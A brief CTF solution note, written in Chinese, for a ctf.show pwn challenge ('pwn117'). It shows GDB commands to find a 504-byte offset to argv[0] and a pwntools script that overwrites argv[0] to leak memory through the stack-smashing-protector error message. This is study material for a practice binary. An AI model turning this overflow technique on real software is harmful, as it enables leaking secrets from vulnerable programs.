![[Pasted image 20260414161012.png]]
Stack Smashing Protect Leak
栈溢出位置和argv[0]的位置之间的偏移怎么算？
#### GDB 动态找偏移（最稳）
```
# 运行到溢出点
p $rsp
p &argv[0]
# 偏移 = &argv[0] - $rsp
```
通过该方法获取偏移值为504(glibc版本太高会无法得出正确答案)
exp:
```
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
\#p = process('./pwn117')
p = remote('pwn.challenge.ctf.show',28232)
elf = ELF('./pwn117')
payload=b"a"\*504+p64(0x6020A0)
\#gdb.attach(p,'b main')
p.sendline(payload)
p.interactive()
```
![[Pasted image 20260414203717.png]]
![[Pasted image 20260414203925.png]]